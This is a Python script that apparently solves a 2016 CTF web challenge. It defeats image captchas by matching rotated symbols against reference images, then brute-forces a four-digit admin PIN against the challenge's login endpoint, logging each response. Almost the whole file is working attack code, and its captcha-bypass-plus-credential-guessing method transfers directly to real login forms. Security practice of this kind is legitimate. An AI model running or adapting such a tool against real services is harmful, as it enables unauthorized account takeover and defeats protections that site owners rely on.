# su-ctf-2016 oldpersian (nice captcha solving technique)

# @skusec

import os
import sys
import re
import cv2
import requests
import itertools
import numpy as np

# For some reason, the DNS resolutions were DEAD slow, so hard-coded
# IPs it is. This increaed the speed dramatically to about 1 attempt per second.

def rot(im, r):
    if r == 0 or r == 360:
        return im
    rows, cols = im.shape
    M = cv2.getRotationMatrix2D((cols/2,rows/2),r,1)
    # By default, the rotation will cause a [0,0,0] border, which would
    # seriously mess up the similarity metric. This assures that the
    # background stays the same and only the symbol rotates visibly.
    return cv2.warpAffine(im, M, (cols, rows), borderValue=[255,255,255])

def download_captcha(file_name):
    captchaurl = 'http://213.233.175.130:32455/chal/oldpersian/e000fa8821cb0106/captcha/'
    headers = {'Cookie': 'SUCTF_SESSION_ID=86sqbe1nm22j5v3kvnv3ianph6; TEST=207320'}
    captcha_img_data = requests.get(captchaurl, headers=headers, proxies={'http': 'http://127.0.0.1:8082'}).content
    with open(file_name, 'wb') as f:
        f.write(captcha_img_data)

def open_captcha(file_name):
    im = cv2.imread(file_name, 0)
    return im

def split_captcha(im):
    images = []
    for i in xrange(6):
        images.append(im[:, i*80:(i+1)*80].copy())
    return images

def build_base():
    # I used this to download a couple of captchas and split them up into symbols.
    # Then I looked at the alphabet mapping to see which letter this should
    # correspond with, and saved it accordingly to e.g. "a.jpeg", "b.jpeg", etc.
    # Once all letters are mapped, this is not needed anymore.
    for i in [2]: #xrange(5):
        file_name = 'captcha-%d.jpeg' % (i)
        #download_captcha(file_name)
        im = open_captcha(file_name)
        symbols = split_captcha(im)
        for sym in symbols:
            # Resize only for display purposes, store the original 80x80 image.
            cv2.imshow('symbol', cv2.resize(sym, (160, 160)))
            # Enter letter for this symbol, and save.
            k = chr(cv2.waitKey(0))
            print 'k: %r' % k
            cv2.imwrite('symbols/%c.jpeg' % (k), sym)

def load_base():
    base = {}
    for c in 'abcdefghijklm':
        file_name = 'symbols/%c.jpeg' % (c)
        im = cv2.imread(file_name, 0)
        base[c] = im
    return base

def mse(imageA, imageB):
    # Dead simple metric: extremely fast and reliable, yay!
    # Taken from: http://www.pyimagesearch.com/2014/09/15/python-compare-two-images/
    a = imageA.astype("float")
    b = imageB.astype("float")
    err = np.sum((a - b) ** 2)
    err /= float(imageA.shape[0] * imageA.shape[1])
    return err

def compare_images2(im1, im2):
    # compare_images1 was SSIM, which sucked hard.
    return mse(im1, im2)

def find_best_match(sym, base):
    best_distances = []
    best_key = 'X'
    best_distance = 999999999
    for r in xrange(-45,45,1):
        # Symbols are only rotated slightly to the left or right, with
        # 45 degrees in both directions we cover every possibility.
        # ORB and SIFT barfed hard at these small images.. so dumb rotate+MSE it is..
        sym_rot = rot(sym, r)
        for key in base:
            reference = base[key]
            distance = compare_images2(sym_rot, reference)
            if distance < best_distance:
                best_distance = distance
                best_key = key
    return best_key

def solve_captcha(file_name, base):
    im = open_captcha(file_name)
    symbols = split_captcha(im)
    result = ''
    for sym in symbols:
        result += find_best_match(sym, base)
    return result

def log_response(password, response):
    # Make sure we don't miss anything, so log EVERY response we get.
    # Sometimes their server barfed out and didn't provide any feedback
    # like false login or invalid captcha..
    with open('responselog/%s.html' % (password), 'w') as f:
        f.write(response)

def login(password, base):
    file_name = 'captcha.jpeg'
    print('>>> Downloading captcha image..')
    download_captcha(file_name)
    print('>>> Solving captcha image..')
    solution = solve_captcha(file_name, base).upper()
    print('>>> Solved: %s' % (solution))

    headers = {'Cookie': 'SUCTF_SESSION_ID=86sqbe1nm22j5v3kvnv3ianph6; TEST=207320'}
    data = {'username': 'admin', 'password': password, 'captcha': solution}
    url = 'http://213.233.175.130:32455/chal/oldpersian/e000fa8821cb0106/login/submit/'
    response = requests.post(url, data=data, headers=headers).content
    log_response(password, response)

    if 'Invalid' in response:
        print('[-] INVALID CAPTCHA')
        sys.stdout.flush()
        return False
    elif 'fail' in response:
        print('[*] BAD PASSWORD, GOOD CAPTCHA')
        sys.stdout.flush()
        return True
    elif 'ok' in response or 'flag' in response or 'admin' in response or 'Sharif' in response:
        # Probably. Or their server is barfing again..
        print('[+] PROBABLY GOT FLAG')
        sys.stdout.flush()
        exit(1)
    else:
        print('[?] UNKNOWN')
        sys.stdout.flush()
        return False

#build_base()
base = load_base()
# Note to self: don't iterate in the most obvious order next time.. stupid 5030 pin..
for d1, d2, d3, d4 in itertools.product('0123456789', repeat=4):
    password = d1 + d2 + d3 + d4
    if os.path.isfile('responselog/%s.html' % (password)) or int(password) < 2858:
        continue

    # Just in case.. luckily the server didn't barf anymore
    # and the captcha solver was 100% accurate through 5030 requests.
    for _ in xrange(5):
        print('>> Attempting password %s ..' % (password))
        if login(password, base):
            break
